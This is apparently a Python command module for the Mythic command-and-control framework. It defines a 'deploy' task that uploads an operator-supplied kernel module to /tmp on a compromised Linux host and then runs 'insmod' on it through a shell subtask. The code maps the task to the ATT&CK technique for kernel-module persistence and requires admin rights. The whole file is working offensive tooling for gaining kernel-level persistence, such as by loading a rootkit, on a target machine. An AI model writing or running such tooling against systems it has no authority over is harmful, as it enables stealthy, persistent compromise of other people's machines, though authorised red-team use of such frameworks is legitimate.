from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import os


class DeployArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="File",
                display_name="Kernel Module File",
                type=ParameterType.File,
                description="Kernel module (.ko) file to deploy",
            ),
        ]
    
    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require arguments.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)

async def upload_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Callback function that runs after the upload completes"""
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    
    # Check if the upload was successful
    if completionMsg.SubtaskData.Task.Status != "completed" or "error" in completionMsg.SubtaskData.Task.Status.lower():
        response.Success = False
        response.TaskStatus = "error: Failed to upload kernel module"
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                Response=f"Failed to upload kernel module".encode()
            )
        )
        return response
    
    # Get the filename from the parent task's args
    filename = completionMsg.TaskData.args.get_arg("filename")
    remote_path = f"/tmp/{filename}"
    
    # Create insmod subtask
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=completionMsg.TaskData.Task.ID,
            CommandName="shell",
            Params=f"insmod {remote_path}"
        )
    )
    
    # Send status update
    await SendMythicRPCResponseCreate(
        MythicRPCResponseCreateMessage(
            TaskID=completionMsg.TaskData.Task.ID,
            Response=f"Kernel module uploaded to {remote_path}. Running insmod...".encode()
        )
    )
    
    return response


class DeployCommand(CommandBase):
    cmd = "deploy"
    needs_admin = True
    help_cmd = "deploy (modal popup)"
    description = "Deploy a kernel module by uploading it to /tmp and running insmod"
    version = 1
    supported_ui_features = []
    author = "Jamie"
    argument_class = DeployArguments
    attackmapping = ["T1547.006", "T1215"]  # Boot or Logon Initialization Scripts: Kernel Modules and Drivers
    attributes = CommandAttributes(
        suggested_command=True,
        dependencies=["upload", "shell"]
    )
    completion_functions = {"upload_complete": upload_complete}

    async def create_go_tasking(
            self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        # Get the uploaded file information
        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID, 
                AgentFileID=taskData.args.get_arg("file")
            )
        )
        
        if not file_resp.Success:
            raise Exception(
                "Failed to fetch uploaded file from Mythic (ID: {})".format(
                    taskData.args.get_arg("file")
                )
            )
        
        original_file_name = file_resp.Files[0].Filename
        
        # Ensure the filename ends with .ko
        if not original_file_name.endswith('.ko'):
            raise Exception(
                "File must be a kernel module (.ko file). Got: {}".format(original_file_name)
            )
        
        # Store the filename for later use in the callback
        taskData.args.add_arg("filename", original_file_name, type=ParameterType.String)
        
        # Set the remote path to /tmp/filename
        remote_path = f"/tmp/{original_file_name}"
        
        # Create upload subtask with completion callback
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                CommandName="upload",
                Params=json.dumps({
                    "file": taskData.args.get_arg("file"),
                    "remote_path": remote_path
                }),
                SubtaskCallbackFunction="upload_complete"
            )
        )
        
        response.DisplayParams = f"Deploying kernel module: {original_file_name}"
        return response
    
    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
